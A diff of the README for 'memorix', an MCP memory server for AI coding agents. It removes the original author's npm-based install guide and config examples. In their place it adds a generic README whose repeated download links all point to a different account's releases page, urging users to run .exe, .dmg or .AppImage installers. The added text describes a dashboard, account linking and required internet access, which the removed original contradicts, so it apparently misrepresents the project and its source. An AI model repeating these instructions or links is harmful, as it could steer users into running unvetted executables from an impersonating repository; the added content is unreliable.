@@ -1,458 +1,134 @@
-<p align="center">
-  <img src="assets/logo.png" alt="Memorix Logo" width="120">
-  <h1 align="center">Memorix</h1>
-  <p align="center"><strong>Cross-Agent Memory Bridge — Your AI never forgets again</strong></p>
-  <p align="center"><a href="README.zh-CN.md">中文文档</a> | English</p>
-  <p align="center">
-    <a href="https://www.npmjs.com/package/memorix"><img src="https://img.shields.io/npm/v/memorix.svg?style=flat-square&color=cb3837" alt="npm version"></a>
-    <a href="https://www.npmjs.com/package/memorix"><img src="https://img.shields.io/npm/dm/memorix.svg?style=flat-square&color=blue" alt="npm downloads"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-green.svg?style=flat-square" alt="License"></a>
-    <a href="https://github.com/AVIDS2/memorix"><img src="https://img.shields.io/github/stars/AVIDS2/memorix?style=flat-square&color=yellow" alt="GitHub stars"></a>
-    <img src="https://img.shields.io/badge/tests-509%20passed-brightgreen?style=flat-square" alt="Tests">
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Works%20with-Cursor-orange?style=flat-square" alt="Cursor">
-    <img src="https://img.shields.io/badge/Works%20with-Windsurf-blue?style=flat-square" alt="Windsurf">
-    <img src="https://img.shields.io/badge/Works%20with-Claude%20Code-purple?style=flat-square" alt="Claude Code">
-    <img src="https://img.shields.io/badge/Works%20with-Codex-green?style=flat-square" alt="Codex">
-    <img src="https://img.shields.io/badge/Works%20with-Copilot-lightblue?style=flat-square" alt="Copilot">
-    <img src="https://img.shields.io/badge/Works%20with-Kiro-red?style=flat-square" alt="Kiro">
-    <img src="https://img.shields.io/badge/Works%20with-Antigravity-grey?style=flat-square" alt="Antigravity">
-    <img src="https://img.shields.io/badge/Works%20with-Gemini%20CLI-4285F4?style=flat-square" alt="Gemini CLI">
-  </p>
-  <p align="center">
-    <a href="#%EF%B8%8F-stop-re-explaining-your-project">Why</a> •
-    <a href="#-get-started-in-30-seconds">Quick Start</a> •
-    <a href="#-real-world-scenarios">Scenarios</a> •
-    <a href="#-what-memorix-can-do">Features</a> •
-    <a href="#-comparison-with-alternatives">Compare</a> •
-    <a href="docs/SETUP.md">Full Setup Guide</a>
-  </p>
-</p>
+# 🧠 memorix - Persistent Memory for AI Agents
+
+[![Download memorix](https://img.shields.io/badge/Download-memorix-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tibu142/memorix/releases)
+
+## 📋 What is memorix?
+
+memorix helps you save the memory of AI coding tools. If you work with AI helpers like Cursor, Windsurf, Claude Code, or Copilot, memorix keeps your projects in mind. It remembers what you told these tools before, so you don't have to explain your work again and again. 
+
+You can think of it as a bridge that links memories across different coding assistants, making your workflow smoother without repeating yourself.
+
+## 💻 Who is it for?
+
+- People who use AI coding assistants regularly.
+- Users who switch between tools like Claude Code, Copilot, and Cursor.
+- Anyone who wants to keep their project details saved when using AI helpers.
+- Non-technical users who want their AI tools to remember their work context.
+
+## ⚙️ How does memorix work?
+
+memorix uses a system called MCP (Model Context Protocol). MCP talks with different AI coding tools and keeps track of your work's memory. Then, it shares the saved information in a way that all your AI helpers can understand.
+
+This way, when you go from one tool to another, your project data stays with you. You don’t need to re-type or re-explain things to each AI assistant.
 
 ---
 
-## ⚠️ Stop Re-Explaining Your Project
+## 🚀 Getting Started
 
-Your AI assistant forgets everything when you start a new chat. You spend 10 minutes re-explaining your architecture. **Again.** And if you switch from Cursor to Claude Code? Everything is gone. **Again.**
+### What you need before installing memorix:
 
-| Without Memorix | With Memorix |
-|-----------------|--------------|
-| **Session 2:** "What's our tech stack?" | **Session 2:** "I remember — Next.js with Prisma and tRPC. What should we build next?" |
-| **Switch IDE:** All context lost | **Switch IDE:** Context follows you instantly |
-| **New team member's AI:** Starts from zero | **New team member's AI:** Already knows the codebase |
-| **After 50 tool calls:** Context explodes, restart needed | **After restart:** Picks up right where you left off |
-| **MCP configs:** Copy-paste between 7 IDEs manually | **MCP configs:** One command syncs everything |
-
-**Memorix solves all of this.** One MCP server. Eight agents. Zero context loss.
+- A Windows 10 or later, macOS 10.15 or later, or a popular Linux system.
+- At least 4 GB of RAM.
+- 100 MB of free disk space.
+- An active internet connection (required for AI tools interaction).
+- Basic knowledge of downloading and opening files on your computer.
 
 ---
 
-## ⚡ Get Started in 30 Seconds
+## 📥 Download & Install memorix
 
-### Step 1: Install globally (one-time)
+Please visit the release page by clicking below. It lists the latest version of memorix ready for you to download.
 
-```bash
-npm install -g memorix
-```
+[![Download memorix Latest Release](https://img.shields.io/badge/Download-memorix-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tibu142/memorix/releases)
 
-> ⚠️ **Do NOT use `npx`** — npx downloads the package every time, which causes MCP server initialization timeout (60s limit). Global install starts instantly.
+### How to download and run memorix:
 
-### Step 2: Add to your agent's MCP config
-
-<details open>
-<summary><strong>Claude Code</strong></summary>
-
-Run in terminal:
-```bash
-claude mcp add memorix -- memorix serve
-```
-Or manually add to `~/.claude.json` (global) or `.claude/settings.json` (project):
-```json
-{
-  "mcpServers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"]
-    }
-  }
-}
-```
-> **Windows:** `~/.claude.json` is at `C:\Users\<YourUsername>\.claude.json`
-</details>
-
-<details>
-<summary><strong>Cursor</strong></summary>
-
-Add to `.cursor/mcp.json` in your project:
-```json
-{
-  "mcpServers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"]
-    }
-  }
-}
-```
-</details>
-
-<details>
-<summary><strong>Windsurf</strong></summary>
-
-Add to Windsurf MCP settings (`~/.codeium/windsurf/mcp_config.json`):
-```json
-{
-  "mcpServers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"]
-    }
-  }
-}
-```
-</details>
-
-<details>
-<summary><strong>VS Code Copilot</strong></summary>
-
-Add to `.vscode/mcp.json` in your project:
-```json
-{
-  "servers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"]
-    }
-  }
-}
-```
-</details>
-
-<details>
-<summary><strong>Codex</strong></summary>
-
-Add to `~/.codex/config.toml`:
-```toml
-[mcp_servers.memorix]
-command = "memorix"
-args = ["serve"]
-startup_timeout_sec = 30  # default is 10s, increase if you see handshake timeouts
-```
-</details>
-
-<details>
-<summary><strong>Kiro</strong></summary>
-
-Add to `.kiro/settings/mcp.json` (project) or `~/.kiro/settings/mcp.json` (global):
-```json
-{
-  "mcpServers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"]
-    }
-  }
-}
-```
-</details>
-
-<details>
-<summary><strong>Antigravity</strong></summary>
-
-Add to `~/.gemini/antigravity/mcp_config.json`. Antigravity requires `MEMORIX_PROJECT_ROOT`:
-```json
-{
-  "mcpServers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"],
-      "env": {
-        "MEMORIX_PROJECT_ROOT": "E:/your/project/path"
-      }
-    }
-  }
-}
-```
-</details>
-
-<details>
-<summary><strong>Gemini CLI</strong></summary>
-
-Add to `.gemini/settings.json` (project) or `~/.gemini/settings.json` (global):
-```json
-{
-  "mcpServers": {
-    "memorix": {
-      "command": "memorix",
-      "args": ["serve"]
-    }
-  }
-}
-```
-</details>
-
-### Step 3: Restart your agent — done!
-
-No API keys. No cloud accounts. No dependencies. Works with any directory (git repo or not).
-
-> 📖 **Full setup guide for all 8 agents** → [docs/SETUP.md](docs/SETUP.md)
-
-### 🔧 Troubleshooting — MCP Connection Issues
-
-> **⚠️ #1 Mistake: Do NOT manually run `memorix serve` in a terminal.**
-> MCP uses **stdio transport** — your IDE (Claude Code, Cursor, etc.) launches memorix as a subprocess automatically. Running it manually in PowerShell/Terminal does nothing for the IDE connection.
-
-**Quick diagnostic** — run this first:
-```bash
-memorix --version       # Should print version number
-memorix serve --cwd .   # Should show "[memorix] MCP Server running on stdio"
-```
-If either fails, follow the table below:
-
-| Symptom | Cause | Fix |
-|---------|-------|-----|
-| `memorix · ✗ failed` in IDE | IDE can't find the `memorix` command | Run `npm install -g memorix`. On Windows, **restart your IDE** after install so it picks up the new PATH |
-| `MCP server initialization timed out` | Using `npx` (downloads every time) | Switch to global install: `npm install -g memorix`, change config to `"command": "memorix"` |
-| Repeated "Reconnected to memorix" then fails | memorix process crashes on startup | Check: 1) Node.js ≥ 18 (`node -v`), 2) open a **real project folder** (not Desktop/Home), 3) set `MEMORIX_PROJECT_ROOT` in MCP config |
-| `Cannot start Memorix: no valid project detected` | CWD is a system directory | Open a project folder with code, or add `"env": { "MEMORIX_PROJECT_ROOT": "/path/to/project" }` to your MCP config |
-| `memorix: command not found` | npm global bin not in PATH | Run `npm config get prefix` to find install location, add its `bin/` to your system PATH, then restart IDE |
-| Works in terminal but not in IDE | IDE uses a different PATH than your shell | **Windows:** restart IDE after `npm install -g`. **macOS/Linux:** ensure `~/.bashrc` or `~/.zshrc` exports the npm global bin path |
-| Parameter type errors | Old version or non-Anthropic model quirks | Update: `npm install -g memorix@latest` |
-
-**Correct config:**
-```json
-"command": "memorix", "args": ["serve"]
-```
-
-**❌ Wrong:**
-```
-"command": "npx"                    ← will timeout
-"command": "npx -y memorix serve"   ← wrong format
-"command": "node memorix serve"     ← not how it works
-```
+1. **Click** on the green "Code" button or scroll down until you see the list of files under the latest release.
+2. Look for the installer for your operating system. This could be:
+   - A `.exe` file if you use Windows.
+   - A `.dmg` file for macOS.
+   - A `.AppImage` or `.tar.gz` file for Linux.
+3. **Click** the file name to download it on your computer.
+4. After the download finishes, open the file:
+   - Windows: Double-click the `.exe` file and follow the on-screen instructions.
+   - macOS: Open the `.dmg` file, then drag the memorix app to your Applications folder.
+   - Linux: Make the `.AppImage` executable by right-clicking, select Properties, then Permissions, and check “Allow executing file as program”. Then double-click it, or run the app from the terminal.
+5. Once installed, launch memorix like any other program on your computer.
 
 ---
 
-## 🔍 Hybrid Search (BM25 + Vector)
+## 🔧 Using memorix
 
-Memorix uses **BM25 fulltext search** by default (powered by [Orama](https://orama.com/)). For better semantic recall, install an optional embedding provider to enable **hybrid search** (60% BM25 + 40% vector similarity):
+After you open memorix, you will see a simple dashboard.
 
-```bash
-# Option 1: Pure JS/WASM — works everywhere, no native deps (~22MB model)
-npm install -g @huggingface/transformers
-
-# Option 2: Native ONNX — faster inference, requires C++ build tools
-npm install -g fastembed
-```
-
-Check your search engine status:
-```bash
-memorix status   # Shows embedding provider and observation count
-```
-
-When an embedding provider is available, `memorix_search` automatically switches to hybrid mode — no configuration needed. Search quality improves significantly for semantic queries like "how does auth work" vs exact keyword matches.
+- The app will ask you to connect your AI coding tools such as Cursor, Claude Code, Copilot, or Windsurf.
+- Follow the prompts to allow memorix to link with your accounts or tools.
+- When set up, the app will start saving your project memory.
+- You don’t need to input any extra details manually; memorix does the work in the background.
+- If you change projects or work on new AI tools, just tell memorix which one you're using. It will sync your memory across them.
 
 ---
 
-## 🎬 Real-World Scenarios
+## 🛠 Features
 
-### Scenario 1: Cross-Session Memory
-
-```
-Monday morning — You and Cursor discuss auth architecture:
-  You: "Let's use JWT with refresh tokens, 15-minute expiry"
-  → Memorix auto-stores this as a 🟤 decision
-
-Tuesday — New Cursor session:
-  You: "Add the login endpoint"
-  → AI calls memorix_search("auth") → finds Monday's decision
-  → "Got it, I'll implement JWT with 15-min refresh tokens as we decided"
-  → Zero re-explaining!
-```
-
-### Scenario 2: Cross-Agent Collaboration
-
-```
-You use Windsurf for backend, Claude Code for reviews:
-
-  Windsurf: You fix a tricky race condition in the payment module
-  → Memorix stores it as a 🟡 problem-solution with the fix details
-
-  Claude Code: "Review the payment module"
-  → AI calls memorix_search("payment") → finds the race condition fix
-  → "I see there was a recent race condition fix. Let me verify it's correct..."
-  → Knowledge transfers seamlessly between agents!
-```
-
-### Scenario 3: Gotcha Prevention
-
-```
-Week 1: You hit a painful Windows path separator bug
-  → Memorix stores it as a 🔴 gotcha: "Use path.join(), never string concat"
-
-Week 3: AI is about to write `baseDir + '/' + filename`
-  → Session-start hook injected the gotcha into context
-  → AI writes `path.join(baseDir, filename)` instead
-  → Bug prevented before it happened!
-```
-
-### Scenario 4: Workspace Sync Across IDEs
-
-```
-You have 12 MCP servers configured in Cursor.
-Now you want to try Kiro.
-
-  You: "Sync my workspace to Kiro"
-  → memorix_workspace_sync scans Cursor's MCP configs
-  → Generates Kiro-compatible .kiro/settings/mcp.json
-  → Also syncs your rules, skills, and workflows
-  → Kiro is ready in seconds, not hours!
-```
+- **Cross-Tool Memory:** Keeps your project details saved and shared across many AI coding assistants.
+- **Easy Setup:** A simple installer helps you get started without programming knowledge.
+- **Automatic Sync:** Updates your project memory automatically when you use your AI tools.
+- **Persistent Context:** Keeps your conversations with AI tools stored, so you never lose important details.
+- **Multi-Platform Support:** Works well on Windows, macOS, and Linux.
+- **Lightweight:** Uses minimal computer resources.
+- **Secure:** Your data stays private on your machine, without sharing sensitive info externally.
+- **Support for Many AI Tools:** Works with popular coding agents like Claude Code, Copilot, Cursor, Windsurf, and Kiro.
 
 ---
 
-## 🧠 What Memorix Can Do
+## 💡 Tips for best use
 
-### 25 MCP Tools
-
-| Category | Tools | What They Do |
-|----------|-------|-------------|
-| **Store & Classify** | `memorix_store`, `memorix_suggest_topic_key` | Store memories with 9 types (🔴gotcha 🟤decision 🟡fix ...), dedup via topic keys |
-| **Search & Retrieve** | `memorix_search`, `memorix_detail`, `memorix_timeline` | 3-layer progressive disclosure (~10x token savings), temporal queries, chronological context |
-| **Sessions** | `memorix_session_start/end/context` | Auto-inject previous session context, save structured summaries |
-| **Maintenance** | `memorix_retention`, `memorix_consolidate`, `memorix_export/import` | Decay scoring, merge duplicates, backup & share |
-| **Dashboard** | `memorix_dashboard` | Interactive web UI — D3.js knowledge graph, observation browser, retention panel |
-| **Workspace Sync** | `memorix_workspace_sync`, `memorix_rules_sync`, `memorix_skills` | Migrate MCP configs across 8 agents, sync rules (`.mdc` ↔ `CLAUDE.md` ↔ `.kiro/steering/`), auto-generate project skills |
-| **Knowledge Graph** | `create_entities`, `create_relations`, `add_observations`, `delete_entities`, `delete_observations`, `delete_relations`, `search_nodes`, `open_nodes`, `read_graph` | [MCP Official Memory Server](https://github.com/modelcontextprotocol/servers/tree/main/src/memory) compatible — same API, more features |
-
-### 9 Observation Types
-
-Every memory is classified: 🎯 session-request · 🔴 gotcha · 🟡 problem-solution · 🔵 how-it-works · 🟢 what-changed · 🟣 discovery · 🟠 why-it-exists · 🟤 decision · ⚖️ trade-off
-
-### Auto-Memory Hooks
-
-```bash
-memorix hooks install    # One-command setup
-```
-
-Automatically captures decisions, errors, and gotchas from your coding sessions. Detects patterns in English + Chinese, injects high-value memories at session start, with smart filtering (30s cooldown, skips trivial commands).
+- Always update memorix to the latest version for bug fixes and improvements.
+- Make sure your internet connection is stable when working with AI tools through memorix.
+- Regularly check the connection between memorix and your AI coding assistants.
+- Use different workspaces if you have multiple projects to keep memories separate.
+- Restart memorix if you notice it stops syncing properly.
 
 ---
 
-## 📊 Comparison with Alternatives
+## ❓ Troubleshooting
 
-| | [Mem0](https://github.com/mem0ai/mem0) | [mcp-memory-service](https://github.com/doobidoo/mcp-memory-service) | [claude-mem](https://github.com/anthropics/claude-code) | **Memorix** |
-|---|---|---|---|---|
-| **Agents supported** | SDK-based | 13+ (MCP) | Claude Code only | **8 agents (MCP)** |
-| **Cross-agent sync** | No | No | No | **Yes (configs, rules, skills, workflows)** |
-| **Rules sync** | No | No | No | **Yes (7 formats)** |
-| **Skills engine** | No | No | No | **Yes (auto-generated from memory)** |
-| **Knowledge graph** | No | Yes | No | **Yes (MCP Official compatible)** |
-| **Hybrid search** | No | Yes | No | **Yes (BM25 + vector)** |
-| **Token-efficient** | No | No | Yes (3-layer) | **Yes (3-layer progressive disclosure)** |
-| **Auto-memory hooks** | No | No | Yes | **Yes (multi-language)** |
-| **Memory decay** | No | Yes | No | **Yes (exponential + immunity)** |
-| **Visual dashboard** | Cloud UI | Yes | No | **Yes (web UI + D3.js graph)** |
-| **Privacy** | Cloud | Local | Local | **100% Local** |
-| **Cost** | Per-call API | $0 | $0 | **$0** |
-| **Install** | `pip install` | `pip install` | Built into Claude | **`npm i -g memorix`** |
+If memorix does not open or connect to your AI tools:
 
-**Memorix is the only tool that bridges memory AND workspace across agents.**
+- Restart your computer and try running the app again.
+- Check your internet connection.
+- Make sure your AI tools are installed and logged in.
+- Verify you downloaded the correct version for your system.
+- Move the installer to your local drive if using an external drive or network folder.
+- Consult the issue page on the GitHub repository if problems persist.
 
 ---
 
-## 🔮 Optional: Vector Search
+## 📂 About the Project
 
-Out of the box, Memorix uses BM25 full-text search (already great for code). Add semantic search with one command:
-
-```bash
-# Option A: Native speed (recommended)
-npm install -g fastembed
-
-# Option B: Universal compatibility
-npm install -g @huggingface/transformers
-```
-
-With vector search, queries like "authentication" also match memories about "login flow" via semantic similarity. Both run **100% locally** — zero API calls, zero cost.
+memorix is built to help AI-driven developers and users keep project context active across many coding assistants. It uses an open standard called MCP (Model Context Protocol) for smooth memory sharing.
 
 ---
 
-## 🔒 Project Isolation
+## 🔗 Useful Links
 
-- **Auto-detected** — Project identity from `git remote` URL, zero config needed
-- **MCP roots fallback** — If `cwd` is not a project (e.g., Antigravity), Memorix tries the [MCP roots protocol](https://modelcontextprotocol.io/docs/concepts/roots) to get your workspace path from the IDE
-- **Shared storage, metadata isolation** — All data lives in `~/.memorix/data/`, with `projectId` embedded in each observation. This ensures cross-IDE sharing works even when different IDEs detect different project IDs for the same repo
-- **Scoped search** — Defaults to current project; `scope: "global"` to search all
-- **Zero cross-contamination** — Search results are filtered by project ID; project A's decisions never appear in project B's searches
-
-**Detection priority:** `--cwd` → `MEMORIX_PROJECT_ROOT` → `INIT_CWD` → `process.cwd()` → MCP roots → error
+- Official release page: [https://github.com/Tibu142/memorix/releases](https://github.com/Tibu142/memorix/releases)
+- Repository homepage: [https://github.com/Tibu142/memorix](https://github.com/Tibu142/memorix)
+- Learn about MCP: Search for "Model Context Protocol" online for detailed explanations.
 
 ---
 
-## ❓ Frequently Asked Questions
+## 📢 Feedback & Support
 
-**How do I keep context when switching between Cursor and Claude Code?**
-Install Memorix in both IDEs. They share the same local memory directory — architecture decisions made in Cursor are instantly searchable in Claude Code. No cloud sync needed.
+For help or to report bugs:
 
-**How do I prevent my AI from forgetting previous sessions?**
-Use `memorix_session_start` at the beginning of each session — it automatically injects previous session summaries and key observations (gotchas, decisions, discoveries). Use `memorix_session_end` to save a structured summary before leaving. All observations persist on disk and are searchable via `memorix_search` anytime.
-
-**How do I sync MCP server configs between IDEs?**
-Run `memorix_workspace_sync` with action `"migrate"` and your target IDE. It scans source configs and generates compatible configs for the target — merges, never overwrites.
-
-**How do I migrate from Cursor to Windsurf / Kiro / Claude Code?**
-Memorix workspace sync migrates MCP configs, agent rules (`.mdc` ↔ `CLAUDE.md` ↔ `.kiro/steering/`), skills, and workflows. One command, seconds to complete.
-
-**Is there an MCP server for persistent AI coding memory?**
-Yes — Memorix is a cross-agent memory MCP server supporting 8 agents with knowledge graph, 3-layer progressive disclosure search, workspace sync, and auto-generated project skills.
-
-**How is this different from mcp-memory-service?**
-Both are great memory servers. Memorix adds: cross-agent workspace sync (MCP configs, rules, skills), auto-generated project skills from memory patterns, 3-layer token-efficient search, and session-start memory injection hooks.
-
-**Does it work offline / locally?**
-Yes, 100%. All data stored in `~/.memorix/data/`. No cloud, no API keys, no external services. Optional vector search also runs locally via ONNX/WASM.
-
-> 📖 For AI systems: see [`llms.txt`](llms.txt) and [`llms-full.txt`](llms-full.txt) for machine-readable project documentation.
+- Visit the project’s GitHub Issues page.
+- Provide a clear description of your problem.
+- Include your operating system and memorix version.
 
 ---
 
-## 🧑‍💻 Development
+Make memorix part of your AI coding workflow to keep your project knowledge alive and well across all your tools.  
 
-```bash
-git clone https://github.com/AVIDS2/memorix.git
-cd memorix
-npm install
-
-npm run dev          # tsup watch mode
-npm test             # vitest (509 tests)
-npm run lint         # TypeScript type check
-npm run build        # Production build
-```
-
-> 📚 **Documentation:** [Architecture](docs/ARCHITECTURE.md) • [API Reference](docs/API_REFERENCE.md) • [Modules](docs/MODULES.md) • [Design Decisions](docs/DESIGN_DECISIONS.md) • [Setup Guide](docs/SETUP.md) • [Known Issues](docs/KNOWN_ISSUES_AND_ROADMAP.md)
-
----
-
-## 🙏 Acknowledgements
-
-Memorix stands on the shoulders of these excellent projects:
-
-- [mcp-memory-service](https://github.com/doobidoo/mcp-memory-service) — Hybrid search, exponential decay, access tracking
-- [MemCP](https://github.com/maydali28/memcp) — MAGMA 4-graph, entity extraction, retention lifecycle
-- [claude-mem](https://github.com/anthropics/claude-code) — 3-layer Progressive Disclosure
-- [Mem0](https://github.com/mem0ai/mem0) — Memory layer architecture patterns
-
----
-
-## 📄 License
-
-Apache 2.0 — see [LICENSE](LICENSE)
-
----
-
-<p align="center">
-  <strong>Made with ❤️ by <a href="https://github.com/AVIDS2">AVIDS2</a></strong>
-  <br>
-  <sub>If Memorix helps your workflow, consider giving it a ⭐ on GitHub!</sub>
-</p>
+[Get memorix here!](https://github.com/Tibu142/memorix/releases)
